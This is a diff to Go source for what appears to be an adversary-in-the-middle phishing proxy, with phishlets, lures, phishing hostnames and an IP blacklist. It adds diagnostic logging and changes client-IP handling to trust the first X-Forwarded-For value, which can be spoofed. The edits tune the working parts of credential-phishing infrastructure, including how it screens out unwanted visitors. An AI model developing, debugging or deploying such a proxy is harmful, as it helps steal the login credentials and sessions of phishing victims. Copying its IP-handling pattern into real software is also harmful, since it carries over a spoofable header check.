@@ -168,33 +168,29 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			hiblue := color.New(color.FgHiBlue)
 
 			// handle ip blacklist
-			from_ip := strings.SplitN(req.RemoteAddr, ":", 2)[0]
-
-			// handle proxy headers
-			proxyHeaders := []string{"X-Forwarded-For", "X-Real-IP", "X-Client-IP", "Connecting-IP", "True-Client-IP", "Client-IP"}
-			for _, h := range proxyHeaders {
-				origin_ip := req.Header.Get(h)
-				if origin_ip != "" {
-					from_ip = strings.SplitN(origin_ip, ":", 2)[0]
-					break
-				}
+			remote_addr := strings.Split(req.RemoteAddr, ":")[0]
+			if req.Header.Get("X-Forwarded-For") != "" {
+				remote_addr = strings.Split(req.Header.Get("X-Forwarded-For"), ",")[0]
 			}
 
+			// DIAGNOSTIC LOGGING
+			log.Important("[PROXY-DIAG] REQ: %s | HOST: %s | PATH: %s | FROM: %s", req.Method, req.Host, req.URL.Path, remote_addr)
+
 			if p.cfg.GetBlacklistMode() != "off" {
-				if p.bl.IsBlacklisted(from_ip) {
+				if p.bl.IsBlacklisted(remote_addr) {
 					if p.bl.IsVerbose() {
-						log.Warning("blacklist: request from ip address '%s' was blocked", from_ip)
+						log.Warning("blacklist: request from ip address '%s' was blocked", remote_addr)
 					}
 					return p.blockRequest(req)
 				}
 				if p.cfg.GetBlacklistMode() == "all" {
-					if !p.bl.IsWhitelisted(from_ip) {
-						err := p.bl.AddIP(from_ip)
+					if !p.bl.IsWhitelisted(remote_addr) {
+						err := p.bl.AddIP(remote_addr)
 						if p.bl.IsVerbose() {
 							if err != nil {
 								log.Error("blacklist: %s", err)
 							} else {
-								log.Warning("blacklisted ip address: %s", from_ip)
+								log.Warning("blacklisted ip address: %s", remote_addr)
 							}
 						}
 					}
@@ -213,7 +209,6 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			}
 
 			pl := p.getPhishletByPhishHost(req.Host)
-			remote_addr := from_ip
 
 			redir_re := regexp.MustCompile("^\\/s\\/([^\\/]*)")
 			js_inject_re := regexp.MustCompile("^\\/s\\/([^\\/]*)\\/([^\\/]*)")
@@ -355,13 +350,13 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 											log.Warning("[%s] unauthorized request (user-agent rejected): %s (%s) [%s]", hiblue.Sprint(pl_name), req_url, req.Header.Get("User-Agent"), remote_addr)
 
 											if p.cfg.GetBlacklistMode() == "unauth" {
-												if !p.bl.IsWhitelisted(from_ip) {
-													err := p.bl.AddIP(from_ip)
+												if !p.bl.IsWhitelisted(remote_addr) {
+													err := p.bl.AddIP(remote_addr)
 													if p.bl.IsVerbose() {
 														if err != nil {
 															log.Error("blacklist: %s", err)
 														} else {
-															log.Warning("blacklisted ip address: %s", from_ip)
+															log.Warning("blacklisted ip address: %s", remote_addr)
 														}
 													}
 												}
@@ -439,16 +434,17 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									req_ok = true
 								}
 							} else {
-								log.Warning("[%s] unauthorized request: %s (%s) [%s]", hiblue.Sprint(pl_name), req_url, req.Header.Get("User-Agent"), remote_addr)
+								log.Warning("[%s] UNAUTHORIZED REQUEST (Rickroll Path): %s (%s) [%s]", hiblue.Sprint(pl_name), req_url, req.Header.Get("User-Agent"), remote_addr)
+								log.Important("[PROXY-DIAG] No matching lure found for host: %s and path: %s", req.Host, req.URL.Path)
 
 								if p.cfg.GetBlacklistMode() == "unauth" {
-									if !p.bl.IsWhitelisted(from_ip) {
-										err := p.bl.AddIP(from_ip)
+									if !p.bl.IsWhitelisted(remote_addr) {
+										err := p.bl.AddIP(remote_addr)
 										if p.bl.IsVerbose() {
 											if err != nil {
 												log.Error("blacklist: %s", err)
 											} else {
-												log.Warning("blacklisted ip address: %s", from_ip)
+												log.Warning("blacklisted ip address: %s", remote_addr)
 											}
 										}
 									}
@@ -1546,9 +1542,9 @@ func (p *HttpProxy) TLSConfigFromCA() func(host string, ctx *goproxy.ProxyCtx) (
 
 			return tls_cfg, nil
 		} else {
-			var ok bool
 			phish_host := ""
 			if !p.cfg.IsLureHostnameValid(hostname) {
+				var ok bool
 				phish_host, ok = p.replaceHostWithPhished(hostname)
 				if !ok {
 					log.Debug("phishing hostname not found: %s", hostname)
